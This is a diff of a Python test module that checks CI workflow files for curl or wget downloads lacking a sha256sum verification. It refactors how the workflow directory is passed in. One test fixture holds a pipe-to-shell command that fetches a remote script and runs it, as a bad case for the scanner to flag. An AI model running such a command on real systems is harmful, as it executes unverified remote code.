@@ -9,16 +9,15 @@ before anything uses it. Rules, per `run:` block containing a download:
 * a later line runs `sha256sum -c` naming that same path, and no line between
   the download and that check mentions the path.
 
-Workflows are read as text (no PyYAML). Point DL_WORKFLOW_DIR at a directory of
-older workflows to confirm the test fails against a pre-change tree.
+Workflows are read as text (no PyYAML). To check against an older tree, call
+scan_workflows with a directory holding those workflows.
 """
 
 import glob
 import os
 import re
-import sys
 
-WORKFLOW_DIR = os.environ.get("DL_WORKFLOW_DIR", ".github/workflows")
+WORKFLOW_DIR = ".github/workflows"
 
 RUN_RE = re.compile(r"^(\s*)(-\s+)?run:\s*(.*?)\s*$")
 FETCH_RE = re.compile(r"\b(curl|wget)\b")
@@ -130,13 +129,13 @@ def unclassified_fetches(text):
     ]
 
 
-def workflow_files():
+def workflow_files(workflow_dir=WORKFLOW_DIR):
     """Return every workflow and composite-action file, .yml and .yaml."""
     patterns = ["*.yml", "*.yaml"]
     found = []
     for pattern in patterns:
-        found += glob.glob(os.path.join(WORKFLOW_DIR, pattern))
-    if WORKFLOW_DIR == ".github/workflows":
+        found += glob.glob(os.path.join(workflow_dir, pattern))
+    if workflow_dir == ".github/workflows":
         for action in ("action.yml", "action.yaml"):
             found += glob.glob(
                 os.path.join(".github", "actions", "**", action), recursive=True
@@ -144,12 +143,12 @@ def workflow_files():
     return sorted(found)
 
 
-def scan_workflows():
+def scan_workflows(workflow_dir=WORKFLOW_DIR):
     """Return (download count, problems) across the workflow files."""
     total = 0
     problems = []
-    for path in workflow_files():
-        name = os.path.relpath(path, os.path.dirname(WORKFLOW_DIR) or ".")
+    for path in workflow_files(workflow_dir):
+        name = os.path.relpath(path, os.path.dirname(workflow_dir) or ".")
         with open(path, encoding="utf-8") as fh:
             text = fh.read()
         for body in run_blocks(text):
@@ -261,11 +260,10 @@ def test_fetch_inside_a_run_block_is_classified():
     assert unclassified_fetches(text) == []
 
 
-def test_yaml_extension_is_scanned(tmp_path, monkeypatch):
+def test_yaml_extension_is_scanned(tmp_path):
     bad = (
         "jobs:\n  j:\n    steps:\n      - run: curl -fsSL https://e.com/latest/x | sh\n"
     )
     (tmp_path / "evil.yaml").write_text(bad, encoding="utf-8")
-    monkeypatch.setattr(sys.modules[__name__], "WORKFLOW_DIR", str(tmp_path))
-    total, problems = scan_workflows()
+    total, problems = scan_workflows(str(tmp_path))
     assert total == 1 and problems
